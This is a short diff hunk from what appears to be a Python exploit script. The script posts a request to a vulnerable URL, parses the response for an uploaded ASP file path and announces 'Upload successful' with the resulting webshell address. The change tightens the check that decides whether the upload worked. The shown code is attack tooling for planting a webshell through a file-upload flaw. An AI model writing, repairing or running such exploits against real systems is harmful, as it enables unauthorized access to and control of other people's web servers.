@@ -56,7 +56,7 @@ Content-Type: text/html
 	
 	try:
 		res = requests.post(vuln_url,headers=headers,data=data,timeout=15,verify=False)
-		if res.status_code == 200 and 'files/edit':
+		if res.status_code == 200 and 'files/edit' in res.text:
 			rsp = re.findall(r'files(.*?)asp', res.text, re.DOTALL)[0]
 			webshell = '{}/files{}asp'.format(url1,rsp)
 			print('\033[32m[+]Upload successful : {}\033[0m'.format(webshell))
